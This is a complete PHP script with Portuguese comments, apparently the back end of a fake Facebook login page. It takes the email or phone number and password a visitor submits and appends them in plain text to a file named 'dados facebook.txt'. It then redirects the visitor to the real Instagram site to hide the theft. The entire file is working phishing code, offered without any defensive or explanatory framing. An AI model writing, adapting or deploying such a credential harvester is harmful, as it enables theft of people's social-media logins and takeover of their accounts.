<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtém os dados do formulário
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Dados a serem gravados no arquivo
    $data = "Email/Telefone: $email, Senha: $password\n";

    // Especifica o arquivo de destino
    $file = 'dados facebook.txt';

    // Abre o arquivo para escrita e adiciona os dados
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        // Redireciona para a página do Instagram
        header("Location: https://www.instagram.com/");
    } else {
        header("Location: facebook.html");
    }
} else {
    echo "Método de solicitação inválido.";
}
?>
